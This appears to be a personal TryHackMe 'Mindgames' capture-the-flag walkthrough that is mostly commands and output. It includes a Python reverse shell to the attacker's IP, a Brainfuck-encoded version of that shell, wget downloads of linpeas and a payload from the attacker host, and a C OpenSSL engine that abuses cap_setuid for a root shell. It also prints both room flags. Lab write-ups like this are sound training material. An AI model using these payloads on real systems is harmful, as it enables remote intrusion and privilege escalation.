<p>Jul 10, 2025 -  Day 430</p>
<h1>Mindgames</h1>
<p>Just a terrible idea...</p>

<p>https://tryhackme.com/room/mindgames</p>


<img width="1899" height="377" alt="image" src="https://github.com/user-attachments/assets/28a1c003-942b-4fab-96ff-b3e6742e23d9" />

<br>
<br>


```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```


```bash
sudo apt-get install html2text
```

```bash
:~/Mindgames# curl -s http://10.10.123.228 | html2text


****** Sometimes, people have bad ideas. ******
****** Sometimes those bad ideas get turned into a CTF box. ******
****** I'm so sorry. ******
Ever thought that programming was a little too easy? Well, I have just the
product for you. Look at the example code below, then give it a go yourself!
Like it? Purchase a license today for the low, low price of 0.009BTC/yr!
***** Hello, World *****
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[-
>+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>--
-.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.
***** Fibonacci *****
--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>--
-<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[-
---->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[--
>+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.------------
-.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[-
>+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[-
>+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.-------
-.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.--------
-.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[---
>+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[-
>+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[--
>+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+
[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[-----
>++<]>-..>++++++++++.
***** Try before you buy. *****

Run it!
Program Output:
```

<p>https://www.dcode.fr/brainfuck-language</p>

<img width="631" height="368" alt="image" src="https://github.com/user-attachments/assets/ea8f9905-20ba-4a6c-9363-a7a1d2df408e" />

<h3>TargetIP</h3>

<img width="1055" height="554" alt="image" src="https://github.com/user-attachments/assets/10a080b0-0a81-4c4c-b402-729570e17ed4" />

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.222.80",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

<p>https://stuff.splitbrain.org/ook/</p>

```bash
+++++ +++++ [->++ +++++ +++<] >++++ +++++ +++.+ +.--- ----- -.+++ ++.++
++++. <++++ ++++[ ->--- ----- <]>-- ----- ----- .---- --.<+ +++++ ++[->
+++++ +++<] >++++ +++.+ +++.+ ++.-. +++.+ +.<++ +++++ ++[-> ----- ----<
]>--- .<+++ +++++ +[->+ +++++ +++<] >++.- ---.< +++[- >---< ]>--- .++++
++++. ----- -.<++ +[->+ ++<]> +++++ +.<++ +++++ +[->- ----- --<]> -----
---.< +++++ +++[- >++++ ++++< ]>+++ ++++. ++.<+ +++[- >---- <]>-- -.<++
+[->+ ++<]> +++++ .++.- --.<+ ++[-> ---<] >---. ++.<+ ++[-> +++<] >++++
+..<+ +++++ ++[-> ----- ---<] >---- ---.< +++++ +++[- >++++ ++++< ]>+++
.++++ .<+++ ++++[ ->--- ----< ]>--- ----. <++++ +++[- >++++ +++<] >++++
+++.< +++++ ++[-> ----- --<]> ----- .<+++ ++++[ ->+++ ++++< ]>+++ ++.--
--.<+ ++[-> ---<] >---. +++++ +++.- ----- .<+++ [->++ +<]>+ +++++ .<+++
+++++ [->-- ----- -<]>- ----- .<+++ +++++ [->++ +++++ +<]>+ ++++. ----.
<+++[ ->--- <]>-- -.+++ +++++ .---- --.<+ ++[-> +++<] >++++ ++.<+ +++++
++[-> ----- ---<] >---- ----- ---.< +++++ +++[- >++++ ++++< ]>+++ +++++
+++.- ---.< +++[- >---< ]>--- .++++ ++++. ----- -.<++ +[->+ ++<]> +++++
+.<++ +++++ +[->- ----- --<]> ----- -.<++ ++[-> ++++< ]>+++ .++++ +.<++
+++[- >++++ +<]>. <++++ [->-- --<]> ----- -.+++ ++.-- ----- --.<+ ++[->
+++<] >++++ ++.<+ +++++ [->-- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]>
+++++ ++.-- --.<+ ++[-> ---<] >---. +++++ +++.- ----- .<+++ [->++ +<]>+
+++++ .<+++ +++++ [->-- ----- -<]>- ----- .<+++ +++[- >++++ ++<]> +.---
-.<++ +[->- --<]> ---.+ +++++ ++.<+ +++[- >++++ <]>++ ++.<+ ++[-> ---<]
>---. +.--. <+++[ ->--- <]>-- --.-- --.<+ ++[-> +++<] >+++. <++++ ++[->
----- -<]>. <++++ [->++ ++<]> ++.<+ +++++ +[->+ +++++ +<]>+ +++++ +.<++
+++++ +[->- ----- --<]> ----- .<+++ ++++[ ->+++ ++++< ]>+++ +.<++ +[->+
++<]> +++.- ..--- ----- -.--. <++++ [->++ ++<]> +.<++ +++++ +[->- -----
--<]> ----- ----- --..- ----- .<+++ [->++ +<]>+ +++++ .-.-- .+++. -.--.
++++. ..--- -.<++ +[->+ ++<]> +.--- ----- .<+++ [->-- -<]>- ----. <+++[
->+++ <]>+. +++++ +++.. ..<++ +[->- --<]> --..< ++++[ ->+++ +<]>+ +.<++
+++++ [->++ +++++ <]>++ +.+++ +.<++ +++++ +[->- ----- --<]> ----- .<+++
++++[ ->+++ ++++< ]>+++ ++.<+ +++[- >++++ <]>+. ----- .<+++ ++++[ ->---
----< ]>--- ----- ----- .<+++ [->-- -<]>- .<+++ +++++ [->++ +++++ +<]>+
+++++ +++++ .<+++ +++++ [->-- ----- -<]>- ----. <++++ +++[- >++++ +++<]
>++++ +++.+ ++.++ +.--- ----. +++++ ++++. +.<++ +++++ +[->- ----- --<]>
----- --.+. +++.+ +++.- ----- -.<++ ++[-> ++++< ]>++. <++++ +[->- ----<
]>--. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ +++.+ +++.< +++++ +++[-
>---- ----< ]>--- --.<+ +++++ +[->+ +++++ +<]>+ ++++. <++++ [->++ ++<]>
+.--- --.<+ +++++ +[->- ----- -<]>- ----- ----- --.<+ ++[-> ---<] >-.<+
+++++ ++[-> +++++ +++<] >++++ +++++ ++.<+ +++++ ++[-> ----- ---<] >----
-.<++ +++++ [->++ +++++ <]>++ +++++ .+++. +++.- ----- -.+++ +++++ +.+.<
+++++ +++[- >---- ----< ]>--- ----. +.+++ .++++ +.--- ----- .<+++ +[->+
+++<] >++.< +++++ [->-- ---<] >--.< +++++ +++[- >++++ ++++< ]>+++ +++++
+++++ ++.++ ++.<+ +++++ ++[-> ----- ---<] >---- -.<++ +++++ [->++ +++++
<]>++ +++.< ++++[ ->+++ +<]>+ .---- -.<++ +++++ [->-- ----- <]>-- -----
----- -.<++ +[->- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +.<++
+++++ +[->- ----- --<]> ----- .<+++ ++++[ ->+++ ++++< ]>+++ ++++. +++.+
++.-- ----- .++++ +++++ .+.<+ +++++ ++[-> ----- ---<] >---- ---.+ .+++.
+++++ +.--- ----- -.<++ ++[-> ++++< ]>++. <++++ +++[- >++++ +++<] >++++
.<+++ ++++[ ->--- ----< ]>--. <++++ +++[- >++++ +++<] >++++ +.++. <++++
[->-- --<]> ---.< +++[- >+++< ]>+++ ++.++ .---. <+++[ ->--- <]>-- -.++.
<+++[ ->+++ <]>++ +++.. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ ++[->
+++++ ++<]> ++++. --.<+ ++[-> +++<] >++.. <++++ ++++[ ->--- ----- <]>--
--.<+ +++++ +[->+ +++++ +<]>+ +.<++ +++++ [->-- ----- <]>-- ----- -.<++
+[->+ ++<]> ++++. <++++ +++[- >++++ +++<] >++.+ +++++ +.+++ ++.<+ +++++
+[->- ----- -<]>- ----- ----- ---.< +++++ ++[-> +++++ ++<]> ++.-. <++++
[->++ ++<]> ++.<+ ++[-> ---<] >--.< +++++ +++[- >---- ----< ]>--- ---.<
+++[- >+++< ]>+.< +++[- >---< ]>-.< +++[- >+++< ]>++. <++++ +++[- >++++
+++<] >++++ +++++ ++.<+ +++++ ++[-> ----- ---<] >---- ---.< +++++ ++[->
+++++ ++<]> +++++ +++++ .<+++ ++++[ ->--- ----< ]>--- .<+++ +[->+ +++<]
>++.< +++++ [->-- ---<] >.+++ ++++. <
```


```bash
:~/Mindgames# nc -nlvp 4444
...mindgames@mindgames:~/webserver$ id
id
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
mindgames@mindgames:~/webserver$ cd /home/mindgames
cd /home/mindgames
mindgames@mindgames:~$ ls -la
ls -la
total 40
drwxr-xr-x 6 mindgames mindgames 4096 May 11  2020 .
drwxr-xr-x 4 root      root      4096 May 11  2020 ..
lrwxrwxrwx 1 mindgames mindgames    9 May 11  2020 .bash_history -> /dev/null
-rw-r--r-- 1 mindgames mindgames  220 May 11  2020 .bash_logout
-rw-r--r-- 1 mindgames mindgames 3771 May 11  2020 .bashrc
drwx------ 2 mindgames mindgames 4096 May 11  2020 .cache
drwx------ 3 mindgames mindgames 4096 May 11  2020 .gnupg
drwxrwxr-x 3 mindgames mindgames 4096 May 11  2020 .local
-rw-r--r-- 1 mindgames mindgames  807 May 11  2020 .profile
-rw-rw-r-- 1 mindgames mindgames   38 May 11  2020 user.txt
drwxrwxr-x 3 mindgames mindgames 4096 May 11  2020 webserver
mindgames@mindgames:~$ cat user.txt
cat user.txt
thm{411f7d38247ff441ce4e134b459b6268}
```

```bash
mindgames@mindgames:~$ cd webserver
cd webserver
mindgames@mindgames:~/webserver$ ls -la
ls -la
total 7032
drwxrwxr-x 3 mindgames mindgames    4096 May 11  2020 .
drwxr-xr-x 6 mindgames mindgames    4096 May 11  2020 ..
drwxrwxr-x 2 mindgames mindgames    4096 May 11  2020 resources
-rwxrwxr-x 1 mindgames mindgames 7188315 May 11  2020 server
mindgames@mindgames:~/webserver$ file server 
file server
server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, not stripped
mindgames@mindgames:/dev/shm$ wget http://10.10.222.80:8000/linpeas.sh
wget http://10.10.222.80:8000/linpeas.sh
...
mindgames@mindgames:/dev/shm$ chmod +x linpeas.sh
mindgames@mindgames:/dev/shm$ ./linpeas.sh
```


<img width="1116" height="556" alt="image" src="https://github.com/user-attachments/assets/9bd51386-acef-4a4e-b14e-193bb435ffbc" />

<img width="1115" height="340" alt="image" src="https://github.com/user-attachments/assets/339543d8-400b-47da-a1c8-0a0274a6d087" />

<p>https://gtfobins.github.io/gtfobins/openssl/#library-load</p>

<img width="1272" height="335" alt="image" src="https://github.com/user-attachments/assets/18089033-3b83-42c0-9319-42ac2f5d54db" />


```bash
mindgames@mindgames:~$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```


```bash
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0);
    system("/bin/sh");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```


```bash
:~# gcc -fPIC -o rose.o -c rose.c
rose.c: In function \u2018bind\u2019:
rose.c:4:5: warning: implicit declaration of function \u2018setuid\u2019 [-Wimplicit-function-declaration]
    4 |     setuid(0);
      |     ^~~~~~
```

```bash
:~# gcc -shared -o rose.so -lcrypto rose.o
      |     ^~~~~~
```

```bash
mindgames@mindgames:/dev/shm$ wget http://10.10.222.80:8000/rose.so
...
mindgames@mindgames:/dev/shm$ chmod +x rose.so     
chmod +x rose.so
mindgames@mindgames:/dev/shm$ openssl req -engine ./rose.so
openssl req -engine ./rose.so
openssl req -engine ./rose.so
id
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
cat /root/root.txt
thm{1974a617cc84c5b51411c283544ee254}
```

<br>
<br>

<img width="1898" height="885" alt="image" src="https://github.com/user-attachments/assets/fd8be378-8fb5-4dd5-b038-fe61490943b0" />

<img width="1905" height="892" alt="image" src="https://github.com/user-attachments/assets/7214d2f0-838a-4c07-bdb4-50dabfd116a2" />

<br>
<br>


<img width="1910" height="893" alt="image" src="https://github.com/user-attachments/assets/5bd5f949-d3fc-43dd-a14c-73ad1d1f45b6" />


<img width="409" height="265" alt="image" src="https://github.com/user-attachments/assets/80577b3b-328b-4cc1-a446-9a25e24cae4a" />

<img width="1893" height="895" alt="image" src="https://github.com/user-attachments/assets/d4525a58-ff59-4326-bbb6-6a8c36a44d4d" />

<img width="1886" height="893" alt="image" src="https://github.com/user-attachments/assets/f902a853-4bc1-4222-a398-6df10e4f0bda" />

<img width="1899" height="899" alt="image" src="https://github.com/user-attachments/assets/21026fd4-10d2-4170-b96d-c0b1e5f5b61f" />
